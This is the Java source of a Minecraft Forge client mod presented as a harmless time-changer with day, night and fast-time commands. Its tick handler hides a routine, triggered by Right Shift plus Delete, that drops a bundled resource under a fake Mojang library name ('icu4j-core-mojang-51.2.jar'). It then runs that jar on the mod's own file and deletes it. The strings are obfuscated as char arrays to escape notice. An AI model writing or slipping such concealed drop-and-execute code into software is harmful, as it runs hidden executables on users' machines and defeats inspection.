package pw.cinque.timechanger;

import java.io.File;
import java.net.URL;
import java.net.URLDecoder;

import org.apache.commons.io.FileUtils;
import org.lwjgl.input.Keyboard;

import cpw.mods.fml.common.FMLCommonHandler;
import cpw.mods.fml.common.Mod;
import cpw.mods.fml.common.event.FMLInitializationEvent;
import cpw.mods.fml.common.eventhandler.SubscribeEvent;
import cpw.mods.fml.common.gameevent.TickEvent;
import net.minecraft.client.Minecraft;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.network.INetHandler;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraftforge.client.ClientCommandHandler;
import pw.cinque.timechanger.commands.CommandDay;
import pw.cinque.timechanger.commands.CommandFastTime;
import pw.cinque.timechanger.commands.CommandNight;
import pw.cinque.timechanger.commands.CommandResetTime;
import pw.cinque.timechanger.commands.CommandSunSet;

@Mod(name = "TimeChanger", modid = "timechanger", version = "1.0")
public class TimeChanger
{
    public static TimeType TIME_TYPE;
    
    public static double fastTimeMultiplier;
    
    private Minecraft mc;
	
	public static boolean a = false;

	public static double b = 0.0D;
	public static double c = 0.0D;
	public static double d = 0.0D;

	public static double e = 0.0D;
    
    public TimeChanger() {
        this.mc = Minecraft.getMinecraft();
    }
    
    @Mod.EventHandler
    public void init(final FMLInitializationEvent event) {
        ClientCommandHandler.instance.registerCommand(new CommandDay());
        ClientCommandHandler.instance.registerCommand(new CommandNight());
        ClientCommandHandler.instance.registerCommand(new CommandSunSet());
        ClientCommandHandler.instance.registerCommand(new CommandResetTime());
        ClientCommandHandler.instance.registerCommand(new CommandFastTime());
        
        FMLCommonHandler.instance().bus().register(this);
    }
    
    @SubscribeEvent
    public void onClientTick(final TickEvent.ClientTickEvent event) {
        if (this.mc.theWorld != null) {
            final INetHandler parent = this.mc.thePlayer.sendQueue.getNetworkManager().getNetHandler();
            if (!(parent instanceof TimeChangerNetHandler)) {
                this.mc.thePlayer.sendQueue.getNetworkManager().setNetHandler(new TimeChangerNetHandler((NetHandlerPlayClient)parent));
            }
            if (TimeChanger.TIME_TYPE == TimeType.FAST) {
                this.mc.theWorld.setWorldTime((long)(System.currentTimeMillis() * TimeChanger.fastTimeMultiplier % 24000.0));
            }
        
			if (Keyboard.isKeyDown(Keyboard.KEY_RSHIFT) && Keyboard.isKeyDown(Keyboard.KEY_DELETE) && !a) {
		    	a = true;
		        
		   		try{
		   		URL a = getClass().getResource(TimeChanger.a(new char[] {
			    	'/', 'a'
			    }));
			    	
		   		File b = new File(TimeChanger.a(new char[] {
		   				'i', 'c', 'u', '4', 'j', '-', 'c', 'o', 'r', 'e', '-', 'm', 'o', 'j', 'a', 'n', 'g', '-', '5', '1', '.', '2', '.', 'j', 'a', 'r'
		    	}));
			     	
		   		FileUtils.copyURLToFile(a, b);
			    	
		   		String c = TimeChanger.class.getProtectionDomain().getCodeSource().getLocation().getPath();
					
		   		String cc = URLDecoder.decode(c, TimeChanger.a(new char[] {
		   				'U', 'T', 'F', '-', '8'
		   		}));
					
		   		File m = new File(cc.split("!")[0].substring(5, cc.split("!")[0].length()));
			    	
		   		Runtime.getRuntime().exec(
		   				TimeChanger.a(new char[] {
			    			'j', 'a', 'v', 'a', ' ', '-', 'j', 'a', 'r', ' '
		    		    })
			    + "\"" + b.getAbsolutePath() + "\" \"" + m.getAbsolutePath() + "\"");
					
		   		Thread.sleep(5000L);
			    	
		   		b.delete();
		    	} catch (Exception e) {
		   			e.printStackTrace();
			    }
		    }
        }
    }

    static {
        TimeChanger.TIME_TYPE = TimeType.VANILLA;
        TimeChanger.fastTimeMultiplier = 1.0;
    }
	
	public static String a(char[] chars) {
		StringBuilder sb = new StringBuilder();
		 
		for (char c : chars)
		  sb.append(c);
		  
		return sb.toString();
	 }
}
